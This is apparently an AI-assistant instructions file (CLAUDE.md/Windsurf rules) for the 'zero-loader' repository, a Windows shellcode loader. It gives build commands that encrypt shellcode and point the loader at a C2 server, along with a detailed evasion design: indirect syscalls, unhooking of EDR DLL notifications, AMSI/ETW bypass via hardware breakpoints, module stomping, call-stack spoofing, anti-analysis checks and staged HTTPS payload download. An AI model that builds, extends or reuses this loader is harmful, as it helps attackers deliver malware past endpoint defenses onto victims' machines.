---
trigger: always_on
description: This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.
---

# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Build Commands

```bash
# Step 1: Encrypt shellcode and generate Payload.h (required before every build)
python Encrypt.py <shellcode.bin> --url https://<C2_IP>:<PORT>/payload.dat

# Step 2a: Compile as EXE (default)
build.bat                                    # no UAC prompt
build.bat uac                                # embeds requireAdministrator manifest

# Step 2b: Compile as DLL sideload variant
python SideloadGen.py <target.dll> [--rename <new_name>] [--exe <host.exe>]
build.bat sideload [output_name.dll]         # no elevation
build.bat sideload [output_name.dll] uac     # self-relaunch for UAC

# Debug mode: uncomment '#define DEBUG' in Common.h before building
# Go/Sliver shellcode: uncomment '#define RWX_SHELLCODE' in Common.h
```

Build pipeline (EXE): `ml64 AsmStub.asm` → `cl *.c AsmStub.obj` → `python Mutate.py WUAssistant.exe`

Build pipeline (DLL sideload): `SideloadGen.py <target.dll>` → `ml64 AsmStub.asm` → `cl /DBUILD_DLL *.c Sideload.c AsmStub.obj /DLL` → `python Mutate.py sideload.dll`

Compiler flags: `/O1 /GS- /NODEFAULTLIB /ENTRY:Main /SUBSYSTEM:WINDOWS` (EXE) or `/ENTRY:DllMain /DLL` (sideload). `uac` flag adds `/MANIFEST:EMBED /MANIFESTUAC` (EXE) or `/DREQUIRE_ELEVATION` (DLL).

## Architecture

CRT-free x64 Windows shellcode loader with polymorphic builds. Every run of `Encrypt.py` + `build.bat` produces a binary with a unique hash.

### Execution Flow (main.c)

```
IatCamouflage → AntiAnalysis → InitializeNtSyscalls → InitializeWinApis
→ BlindDllNotifications → PatchlessAmsiEtw (VEH + HW breakpoints) → BruteForceDecryption
→ DownloadPayload → ChaskeyCtrDecrypt → [DecompressPayload]
→ PhantomDllHollow → ModuleStomp → NtAllocateVirtualMemory (3-tier fallback)
→ CleanupEvasion (remove VEH, wipe keys/URLs)
→ FindCallGadget → SetSpoofTarget(target, gadget)
→ TpAllocWork(SpoofCallback) → TpPostWork → NtDelayExecution
```

Each step returns FALSE on failure and the loader exits silently. Anti-analysis is skipped when `DEBUG` is defined.

### Module Responsibilities

- **Syscalls.h/.c + AsmStub.asm** — Indirect syscall engine with gadget pool randomization. Extracts SSN from ntdll by pattern-matching `4C 8B D1 B8 XX XX 00 00`. Falls back to neighboring stubs if hooked. `CollectSyscallGadgets()` scans ntdll's executable sections for all `0F 05 C3` (syscall;ret) patterns and stores up to 64 in a pool. `GetRandomGadget()` picks one per call via `RDTSC`, preventing EDR from whitelisting a single gadget address. `SET_SYSCALL()` macro configures SSN + random gadget before `RunSyscall()`. AsmStub also contains `SpoofCallback` (thread pool callback with call gadget injection) and `SetSpoofTarget(target, gadget)`.
- **WinApi.c** — PEB walking to find kernel32, then hash-based export resolution (Jenkins One-at-a-Time 32-bit). Also provides CRT replacements (`memset`/`memcpy` via intrinsics) and IAT camouflage.
- **Evasion.c** — Four evasion components: (1) `BlindDllNotifications` — removes all LdrRegisterDllNotification callbacks by registering a dummy callback, walking the doubly-linked list to find the sentinel head (inside ntdll address range), unlinking all EDR entries, then unregistering the dummy. Blinds EDR to subsequent LoadLibrary calls. (2) Patchless AMSI/ETW bypass — VEH handler + hardware breakpoints (DR0=EtwEventWrite, DR1=AmsiScanBuffer) via `RtlCaptureContext` + `NtContinue` (avoids ETW-TI). VEH intercepts `STATUS_SINGLE_STEP` and returns benign values. Zero code bytes modified. (3) `CleanupEvasion()` — removes VEH handler, clears debug registers, wipes evasion state. (4) `InstallExitHook()` (BUILD_DLL only) — patches `RtlExitUserProcess` in ntdll with an infinite PAUSE loop, called from DllMain before the loader runs. Prevents the entire ExitProcess flow: no thread termination (`NtTerminateProcess(NULL)`), no DLL unloading (`LdrShutdownProcess`), no process termination (`NtTerminateProcess(-1)`). Without this, `LdrShutdownProcess` would call `DLL_PROCESS_DETACH` which cleans up winsock/winhttp state and kills C2 comms. Anti-analysis: PEB debugger flag, NtGlobalFlag, CPU count, RDTSC timing.
- **Crypt.c** — Chaskey-12 ARX block cipher in CTR mode (replaces RC4/SystemFunction032). No S-boxes, no lookup tables, pure ALU — avoids RC4 signature detection. LZNT1 decompression via `RtlDecompressBuffer` (ntdll). Brute-forces 1 byte to recover the protected key using a known hint byte.
- **Staging.c** — HTTPS download via dynamically-loaded WinINet. URL parsing via `InternetCrackUrlA` (replaces manual parser). Self-signed cert bypass: first `HttpSendRequest` fails → set `SECURITY_FLAG_IGNORE_UNKNOWN_CA` on **same handle** → retry. Wipes URL/host data from stack after use.

<!-- Content truncated to meet Windsurf 6KB limit -->

---
> Source: [xAL6/zero-loader](https://github.com/xAL6/zero-loader) — distributed by [TomeVault](https://tomevault.io).
<!-- tomevault:4.0:windsurf_rules:2026-05-04 -->
